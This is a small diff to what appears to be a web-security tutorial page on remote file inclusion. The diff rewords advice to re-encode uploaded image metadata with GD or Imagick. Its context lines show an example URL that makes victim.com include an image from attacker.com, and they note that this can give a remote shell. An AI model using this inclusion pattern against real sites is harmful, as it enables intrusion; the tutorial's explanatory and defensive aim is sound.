@@ -345,7 +345,7 @@
     <p><code
         class="bg-dark text-white p-1">https://victim.com/?page=<span class="text-danger">https://attacker.com/image.png</span></code>
     </p>
-    <p>Better safe than sorry. We should encode the original metadata of the file with an image library like GD or
+    <p>Better safe than sorry. We should re-encode the metadata of the file with an image library like GD or
       Imagick.</p>
     <img class="center image" src="images/image-metadata.png" />
     <p>This can get me a remote shell as long as I can execute that image inside the page.</p>
